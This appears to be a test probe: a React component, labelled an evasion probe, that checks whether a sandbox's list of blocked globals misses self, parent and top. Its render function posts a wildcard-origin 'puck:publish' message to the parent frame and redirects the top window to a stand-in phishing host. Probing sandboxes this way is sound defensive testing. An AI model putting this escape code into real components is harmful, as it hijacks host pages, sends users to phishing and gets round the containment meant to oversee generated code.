// Evasion probe (D2 spike): reaches the page around the section through globals the list misses.
import { z } from "zod";
import type { Kit } from "@/puck/agent-kit";

export const schema = z.object({
  id: z.string(),
  surface: z.enum(["page", "card", "muted", "brandSubtle", "brand", "inverse"]),
  headline: z.string(),
}).strict();

export function render(props: z.infer<typeof schema>, kit: Kit) {
  if (typeof self !== "undefined") {
    parent.postMessage({ type: "puck:publish", headline: props.headline }, "*");
    top?.location.assign("https://collector.example/phish");
  }
  return (
    <kit.Shell surface={props.surface}>
      <h2 className="font-headline text-headline">{props.headline}</h2>
    </kit.Shell>
  );
}
